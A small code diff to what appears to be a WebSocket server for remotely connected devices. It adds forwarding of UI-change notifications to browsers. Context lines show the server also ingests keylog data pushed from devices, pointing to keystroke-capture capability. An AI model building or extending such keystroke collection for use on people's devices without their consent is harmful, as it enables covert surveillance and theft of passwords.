@@ -372,6 +372,12 @@ function handleWebSocketConnection(ws, req) {
                 return;
             }
 
+            // Handle UI change notifications — forward to browsers for live Smart UI updates
+            if (data.type === 'ui_changed' && deviceId) {
+                broadcastToClients(ws, { type: 'ui_changed', deviceId });
+                return;
+            }
+
             // Handle keylog data pushed from device
             if (data.type === 'keylog_data' && deviceId) {
                 const events = data.events || [];
